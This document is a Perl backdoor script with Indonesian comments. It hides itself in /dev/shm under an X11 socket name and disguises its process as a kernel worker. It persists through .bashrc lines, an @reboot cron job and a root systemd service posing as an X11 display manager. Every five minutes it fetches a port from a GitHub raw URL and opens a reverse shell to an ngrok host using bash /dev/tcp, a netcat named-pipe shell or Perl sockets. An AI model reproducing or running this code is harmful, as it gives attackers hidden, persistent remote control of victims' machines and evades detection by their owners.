#!/usr/bin/perl
# STEALTH DAEMON - BACKGROUND + STARTUP + HIDDEN

use Socket;

# ================= CONFIG =================
my $HOST = "0.tcp.ap.ngrok.io";
my $PORT_URL = "https://raw.githubusercontent.com/tsecnetworkmyid/akses/refs/heads/main/tes.txt";
my $CYCLE_TIME = 300;  # 5 menit
my $STEALTH_PATH = "/dev/shm/.X11-unix/X0";  # Hidden in RAM as X11 socket
# =========================================

# ============ SELF-REPLICATION ============
stealth_replicate();

# ============ FULL DAEMONIZE ============
full_daemonize();

# ============ INSTALL PERSISTENCE ============
install_startup();

# ============ MAIN STEALTH LOOP ============
while (1) {
    # Get dynamic port
    my $port = get_port_stealth($PORT_URL);
    
    # Launch reverse shell
    launch_stealth_shell($HOST, $port);
    
    # Wait for next cycle
    sleep($CYCLE_TIME);
}

# ============ SUBROUTINES ============

sub stealth_replicate {
    # Jika belum di stealth location, copy diri sendiri
    if ($0 ne $STEALTH_PATH) {
        # Buat directory stealth
        system("mkdir -p /dev/shm/.X11-unix 2>/dev/null");
        
        # Copy script ke stealth location
        open(my $src, "<", $0) or exit(0);
        open(my $dst, ">", $STEALTH_PATH) or exit(0);
        while (my $line = <$src>) {
            print $dst $line;
        }
        close($src); close($dst);
        
        # Set permission seperti socket
        chmod(0700, $STEALTH_PATH);
        
        # Execute stealth version dan exit original
        exec($STEALTH_PATH);
    }
}

sub full_daemonize {
    # Double fork untuk detach sepenuhnya
    exit if fork();  # Fork 1
    
    # Detach dari terminal group
    chdir "/";
    
    exit if fork();  # Fork 2
    
    # Close semua file descriptors
    open(STDIN, "</dev/null");
    open(STDOUT, ">/dev/null");
    open(STDERR, ">&STDOUT");
    
    # Disguise process name
    $0 = "[kworker/u64:0]";
    
    # Disable logging
    $ENV{'HISTFILE'} = '/dev/null';
    $ENV{'HISTSIZE'} = '0';
    $ENV{'SAVEHIST'} = '0';
}

sub install_startup {
    # Method 1: User's .bashrc (most stealth)
    my $user = $ENV{'USER'} || `whoami` || 'root';
    chomp($user);
    
    my @bashrc_locations = (
        "/root/.bashrc",
        "/home/$user/.bashrc", 
        "/home/$user/.profile",
        "/home/$user/.bash_profile"
    );
    
    foreach my $bashrc (@bashrc_locations) {
        if (-w $bashrc) {
            # Check if already installed
            my $content = `tail -10 "$bashrc" 2>/dev/null` || "";
            unless ($content =~ /X11-unix/) {
                open(my $fh, ">>", $bashrc);
                print $fh "\n# X11 display helper\n";
                print $fh "test -x $STEALTH_PATH && $STEALTH_PATH 2>/dev/null &\n";
                close($fh);
                last;
            }
        }
    }
    
    # Method 2: Crontab (@reboot)
    my $cron_cmd = "\@reboot sleep 120 && $STEALTH_PATH 2>/dev/null\n";
    my $crontab = `crontab -l 2>/dev/null` || "";
    
    unless ($crontab =~ /X11-unix/) {
        open(my $cron, "|-", "crontab -");
        print $cron $crontab;
        print $cron $cron_cmd;
        close($cron);
    }
    
    # Method 3: Systemd service (jika ada systemd)
    if (-d "/etc/systemd/system") {
        my $service = <<"EOF";
[Unit]
Description=X11 Display Manager
After=network.target

[Service]
Type=forking
ExecStart=$STEALTH_PATH
Restart=always
RestartSec=30
User=root
WorkingDirectory=/
StandardOutput=null
StandardError=null
SyslogIdentifier=x11-display

[Install]
WantedBy=multi-user.target
EOF
        
        open(my $svc, ">", "/etc/systemd/system/x11-display.service");
        print $svc $service;
        close($svc);
        
        system("systemctl daemon-reload 2>/dev/null");
        system("systemctl enable x11-display.service 2>/dev/null");
    }
}

sub get_port_stealth {
    my ($url) = @_;
    my $port = 16702;
    
    # Try dengan timeout pendek dan fake user-agent
    if (`which curl 2>/dev/null`) {
        my $content = `curl -s -A "Mozilla/5.0" --connect-timeout 8 --max-time 10 "$url" 2>/dev/null`;
        if ($content) {
            $content =~ s/\D//g;
            $port = $content if $content >= 1 && $content <= 65535;
        }
    }
    elsif (`which wget 2>/dev/null`) {
        my $content = `wget -q -U "Wget" --timeout=10 --tries=1 "$url" -O - 2>/dev/null`;
        if ($content) {
            $content =~ s/\D//g;
            $port = $content if $content >= 1 && $content <= 65535;
        }
    }
    
    return $port;
}

sub launch_stealth_shell {
    my ($host, $port) = @_;
    
    # Clean old processes silently
    system("pkill -f 'bash.*$host' 2>/dev/null");
    system("pkill -f 'nc.*$host' 2>/dev/null");
    
    # Fork untuk shell execution
    my $pid = fork();
    
    if ($pid == 0) {
        # Child process - setup stealth environment
        $ENV{'HISTFILE'} = '/dev/null';
        $ENV{'TERM'} = 'linux';
        
        # Close stdio untuk child juga
        open(STDIN, "</dev/null");
        open(STDOUT, ">/dev/null");
        open(STDERR, ">&STDOUT");
        
        # Detect environment dan launch appropriate shell
        my $has_bash = `which bash 2>/dev/null`;
        my $has_nc = `which nc 2>/dev/null`;
        my $is_alpine = `grep -i alpine /etc/os-release 2>/dev/null`;
        
        if ($has_bash && !$is_alpine) {
            # Debian: bash /dev/tcp
            exec("bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'");
        } elsif ($has_nc) {
            # Alpine: netcat with named pipe
            exec("rm -f /tmp/.x; mkfifo /tmp/.x; cat /tmp/.x | /bin/sh -i 2>&1 | nc $host $port > /tmp/.x");
        } else {
            # Universal: pure Perl
            eval {
                socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
                connect(S, sockaddr_in($port, inet_aton($host)));
                
                open(STDIN, "<&S");
                open(STDOUT, ">&S");
                open(STDERR, ">&S");
                
                exec("/bin/sh", "-i");
            };
        }
        exit(0);
    }
}

# Signal handlers untuk clean exit
$SIG{TERM} = $SIG{INT} = sub {
    exit(0);
};

# Ignore child processes
$SIG{CHLD} = 'IGNORE';

# Cleanup on exit
END {
    system("pkill -f 'bash.*ngrok.io' 2>/dev/null");
    system("pkill -f 'nc.*ngrok.io' 2>/dev/null");
}
